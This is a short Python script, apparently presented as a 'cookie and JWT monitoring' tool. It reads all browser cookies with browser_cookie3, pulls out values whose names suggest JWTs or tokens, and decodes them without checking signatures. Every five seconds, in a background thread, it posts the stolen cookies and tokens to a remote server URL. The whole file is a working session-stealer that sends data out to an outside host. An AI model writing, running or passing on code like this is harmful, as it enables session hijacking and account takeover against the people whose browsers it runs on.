import requests
import browser_cookie3
import jwt
import json
import time
import threading
from datetime import datetime

SERVER_URL = "https://your-secure-server.com/api/tokens"

def get_cookies():
    try:
        cookies = browser_cookie3.load()
        return [{'domain': cookie.domain, 'name': cookie.name, 'value': cookie.value} for cookie in cookies]
    except Exception as e:
        print(f"Error retrieving cookies: {e}")
        return []

def get_jwt_tokens():
    try:
        # This is a placeholder; actual JWT extraction depends on the application
        # For demonstration, we'll simulate finding JWT in localStorage or cookies
        cookies = browser_cookie3.load()
        jwt_tokens = []
        for cookie in cookies:
            if 'jwt' in cookie.name.lower() or 'token' in cookie.name.lower():
                try:
                    decoded = jwt.decode(cookie.value, options={"verify_signature": False})
                    jwt_tokens.append({'token': cookie.value, 'decoded': decoded})
                except:
                    jwt_tokens.append({'token': cookie.value, 'decoded': None})
        return jwt_tokens
    except Exception as e:
        print(f"Error retrieving JWT tokens: {e}")
        return []

def send_to_server(data):
    try:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(SERVER_URL, data=json.dumps(data), headers=headers)
        if response.status_code != 200:
            print(f"Failed to send data to server: {response.text}")
    except Exception as e:
        print(f"Error sending data to server: {e}")

def monitor_and_transmit():
    while True:
        timestamp = datetime.now().isoformat()
        cookies = get_cookies()
        jwt_tokens = get_jwt_tokens()

        data = {
            'timestamp': timestamp,
            'cookies': cookies,
            'jwt_tokens': jwt_tokens
        }

        send_to_server(data)
        time.sleep(5)  # Adjust the interval as needed

if __name__ == "__main__":
    print("Starting cookie and JWT monitoring...")
    monitor_thread = threading.Thread(target=monitor_and_transmit)
    monitor_thread.daemon = True
    monitor_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping monitoring...")
